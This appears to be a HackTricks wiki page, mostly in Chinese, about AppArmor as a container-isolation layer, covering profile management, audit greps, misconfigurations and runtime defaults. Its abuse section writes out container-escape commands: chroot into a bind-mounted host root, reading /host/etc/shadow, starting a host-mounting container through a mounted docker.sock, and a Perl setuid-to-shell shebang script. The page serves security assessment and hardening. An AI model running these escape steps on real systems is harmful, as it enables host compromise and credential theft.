# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一个通过每个程序配置文件施加限制的 **强制访问控制** 系统。与传统的 DAC 检查不同，传统检查在很大程度上依赖于用户和组的所有权，AppArmor 允许内核对附加到进程本身的策略进行强制执行。在容器环境中，这一点很重要，因为工作负载可能拥有足够的传统权限去尝试某个操作，但仍会被拒绝，因为其 AppArmor 配置文件不允许相关的路径、挂载、网络行为，或 capability 的使用。

最重要的概念性要点是 AppArmor 是 **基于路径的**。它通过路径规则来判断对文件系统的访问，而不是像 SELinux 那样通过标签。这使得它既易于理解又强大，但也意味着 bind mounts 和替代路径布局需要特别注意。如果相同的主机内容通过不同路径变得可访问，策略的效果可能不会像操作员最初预期的那样。

## 在容器隔离中的作用

容器安全审核通常止步于 capabilities 和 seccomp，但在这些检查之后 AppArmor 仍然很重要。想象一个拥有超出应有权限的容器，或者为了运行需要额外 capability 的工作负载。AppArmor 仍可以限制文件访问、挂载行为、网络和执行模式，从而阻断明显的滥用路径。这就是为什么为了“仅为让应用运行”而禁用 AppArmor 可能会悄然将一个仅有风险的配置变成可被主动利用的配置。

## 实验

要检查主机上是否启用了 AppArmor，请使用：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
要查看当前容器进程以什么身份运行：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
这个差异很具有说明性。在正常情况下，进程应显示与运行时选择的配置文件绑定的 AppArmor 上下文。在 unconfined 情况下，那一额外的限制层就会消失。

你还可以检查 Docker 认为它应用了什么：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker can apply a default or custom AppArmor profile when the host supports it. Podman can also integrate with AppArmor on AppArmor-based systems, although on SELinux-first distributions the other MAC system often takes center stage. Kubernetes can expose AppArmor policy at the workload level on nodes that actually support AppArmor. LXC and related Ubuntu-family system-container environments also use AppArmor extensively.

关键点是 AppArmor 不是一个“Docker feature”。它是宿主机内核的特性，多个 runtimes 可以选择应用它。如果宿主机不支持它，或者 runtime 被告知以 `unconfined` 模式运行，那么所谓的保护实际上并不存在。

对于 Kubernetes 而言，现代 API 是 `securityContext.appArmorProfile`。自 Kubernetes `v1.30` 起，旧的 beta AppArmor 注解已被弃用。在支持的主机上，`RuntimeDefault` 是默认配置文件，而 `Localhost` 指向必须已在节点上加载的配置文件。这在审查时很重要，因为清单 (manifest) 可能看起来支持 AppArmor，但仍然完全依赖节点端的支持和预加载的配置文件。

一个微妙但有用的操作细节是，显式设置 `appArmorProfile.type: RuntimeDefault` 比简单省略该字段更严格。如果显式设置了该字段且节点不支持 AppArmor，则 admission 应该失败。如果省略该字段，工作负载仍可能在不支持 AppArmor 的节点上运行，只是不会获得那一层额外的隔离。从攻击者的角度看，这就是同时检查 manifest 和实际节点状态的好理由。

在支持 AppArmor 的 Docker 主机上，最广为人知的默认配置是 `docker-default`。该配置文件由 Moby 的 AppArmor 模板生成，这一点很重要，因为它解释了为什么一些基于 capability 的 PoCs 在默认容器中仍会失败。概括来说，`docker-default` 允许普通网络访问，拒绝对大部分 `/proc` 的写入，拒绝访问 `/sys` 的敏感部分，阻止 mount 操作，并限制 ptrace，使其不成为通用的主机探测原语。理解这一基线有助于区分“容器具有 `CAP_SYS_ADMIN`”与“容器实际上能否对我关心的内核接口使用该能力”。

## Profile Management

AppArmor profiles are usually stored under `/etc/apparmor.d/`. A common naming convention is to replace slashes in the executable path with dots. For example, a profile for `/usr/bin/man` is commonly stored as `/etc/apparmor.d/usr.bin.man`. This detail matters during both defense and assessment because once you know the active profile name, you can often locate the corresponding file quickly on the host.

有用的主机端管理命令包括：
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
这些命令在 container-security 参考中之所以重要，是因为它们说明了配置文件实际上如何被构建、加载、切换到 complain 模式，以及在应用更改后如何被修改。如果运维人员在排障时习惯将配置文件切换到 complain 模式并忘记恢复强制执行，容器在文档中看起来受保护，但实际运行时可能更为宽松。

### 构建与更新配置文件

`aa-genprof` 可以观察应用行为并交互式地帮助生成配置文件：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 可以生成一个模板配置文件，之后可以使用 `apparmor_parser` 加载：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
当二进制文件发生更改且策略需要更新时，`aa-logprof` 可以重放日志中记录的拒绝条目，并协助操作员决定是否允许或拒绝它们：
```bash
sudo aa-logprof
```
### 日志

AppArmor 的拒绝通常可以通过 `auditd`、syslog 或类似 `aa-notify` 的工具看到：
```bash
sudo aa-notify -s 1 -v
```
这在操作和进攻上都很有用。防御者用它来完善配置文件。攻击者用它来确定哪个具体路径或操作被拒绝，以及 AppArmor 是否是阻止利用链的控制机制。

### 确定确切的配置文件

当 runtime 为 container 显示特定的 AppArmor profile 名称时，通常有必要将该名称映射回磁盘上的配置文件：
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
这在主机端审查时尤其有用，因为它弥合了“the container 表示它在 profile `lowpriv` 下运行”和“实际规则存放在可以审计或重新加载的特定文件中”之间的差距。

### 高信号规则需审计

当你能够读取 profile 时，不要仅停留在简单的 `deny` 条目。几类规则会显著改变 AppArmor 在防范 container 逃逸尝试时的有效性：

- `ux` / `Ux`：执行目标二进制，使其 unconfined。若在 `ux` 下允许可访问的 helper、shell 或 interpreter，这通常是首先要测试的点。
- `px` / `Px` 和 `cx` / `Cx`：在 exec 时执行 profile 转换。它们并不自动意味着风险，但值得审计，因为转换可能会落入比当前更宽松的 profile。
- `change_profile`：允许任务切换到另一个已加载的 profile，立即生效或在下一次 exec 时生效。如果目标 profile 更弱，它可能成为从限制性域中逃逸的预期出口。
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`：这些会改变你对 profile 的信任程度。`complain` 记录拒绝而不是强制执行，`unconfined` 移除边界，`prompt` 依赖于 userspace 的决策路径，而不是纯粹由内核强制拒绝。
- `userns` or `userns create,`：较新的 AppArmor 策略可以调节 user namespaces 的创建。如果 container profile 明确允许它，即使平台将 AppArmor 用作加固策略的一部分，嵌套的 user namespaces 仍然可能被利用。

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这种审计通常比盯着数百条普通文件规则更有用。如果一个 breakout 依赖于执行 helper、进入新的 namespace，或逃逸到更宽松的 profile，答案通常隐藏在这些面向转换的规则中，而不是明显的 `deny /etc/shadow r` 那类行。

## 误配置

最明显的错误是 `apparmor=unconfined`。管理员常在调试导致 profile 正确阻止了某些危险或意外行为的应用时设置它。如果该标志留在生产环境中，整个 MAC 层实际上就被移除了。

另一个微妙的问题是假设 bind mounts 无害，因为文件权限看起来正常。由于 AppArmor 是基于路径的，在备用挂载位置暴露主机路径可能会与路径规则产生不良交互。第三个错误是忘记如果主机内核并未实际强制执行 AppArmor，那么配置文件中的 profile 名称几乎毫无意义。

## 滥用

当 AppArmor 不存在时，之前受限的操作可能会突然生效：通过 bind mounts 读取敏感路径、访问本应更难使用的 procfs 或 sysfs 部分、如果 capabilities/seccomp 也允许则执行与挂载相关的操作，或使用一个 profile 通常会拒绝的路径。AppArmor 常常是解释为什么基于 capability 的 breakout 尝试从理论上 "should work" 但在实践中仍然失败的机制。移除 AppArmor， 同样的尝试可能会开始成功。

如果你怀疑 AppArmor 是阻止 path-traversal、bind-mount 或基于挂载的滥用链的主要因素，第一步通常是比较有无 profile 时可访问的内容。例如，如果 host path 被挂载到 container 内，先检查你是否可以遍历并读取它：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
如果容器也具有像 `CAP_SYS_ADMIN` 这样的危险 capability，最实用的测试之一是确定 AppArmor 是否在阻止挂载操作或访问敏感的内核文件系统：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
在通过 bind mount 已经可以访问 host path 的环境中，失去 AppArmor 可能会把一个只读的信息泄露问题升级为直接访问主机文件：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
这些命令的要点并不是 AppArmor 单独导致 breakout。关键是，一旦移除 AppArmor，许多基于文件系统和挂载的滥用路径就会立即变得可测试。

### 完整示例：禁用 AppArmor + 主机根挂载

如果容器已经将主机根目录以 bind-mount 的方式挂载在 `/host`，移除 AppArmor 可以把一个被阻止的文件系统滥用路径变成完整的主机逃逸：
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一旦 shell 通过宿主文件系统执行，工作负载就已有效逃出容器边界：
```bash
id
hostname
cat /etc/shadow | head
```
### 完整示例：AppArmor 已禁用 + Runtime Socket

如果真正的防护是 AppArmor 围绕运行时状态，那么一个挂载的 socket 就足以实现完全逃逸：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
确切的路径取决于挂载点，但结果相同：AppArmor 不再阻止对 runtime API 的访问，runtime API 可以启动一个可危及主机的 container。

### 完整示例：Path-Based Bind-Mount Bypass

由于 AppArmor 基于路径，保护 `/proc/**` 并不会自动保护通过不同路径可访问的相同 host procfs 内容：
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影响取决于具体挂载了什么以及替代路径是否也 bypass 其他控制，但这种模式是将 AppArmor 与 mount layout 一起评估而非孤立评估的最明显理由之一。

### 完整示例: Shebang Bypass

AppArmor 策略有时以针对解释器路径的方式编写，但这种方式并未充分考虑通过 shebang 处理执行脚本的情况。一个历史示例涉及使用一个脚本，其第一行指向一个受限的解释器：
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
这种示例很重要，它提醒我们配置文件的意图与实际执行语义可能会发生偏离。在审查容器环境中的 AppArmor 时，应特别注意解释器链和替代执行路径。

## 检查

这些检查的目标是快速回答三个问题：宿主机上是否启用了 AppArmor、当前进程是否受限，以及运行时是否实际对该容器应用了配置文件？
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的主机上默认启用 | 使用 `docker-default` AppArmor profile，除非被覆盖 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 取决于主机 | 通过 `--security-opt` 支持 AppArmor，但确切默认取决于主机/运行时，不如 Docker 的 `docker-default` profile 那么通用 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 有条件的默认值 | 如果 `appArmorProfile.type` 未指定，默认是 `RuntimeDefault`，但仅在节点启用 AppArmor 时才会应用 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | 跟随节点/运行时的支持 | 常见的 Kubernetes 支持的运行时支持 AppArmor，但实际强制仍取决于节点支持和工作负载设置 | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

对于 AppArmor，最重要的变量往往是 **主机**，而不仅仅是运行时。清单中的配置文件设置在未启用 AppArmor 的节点上本身不会产生隔离效果。

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
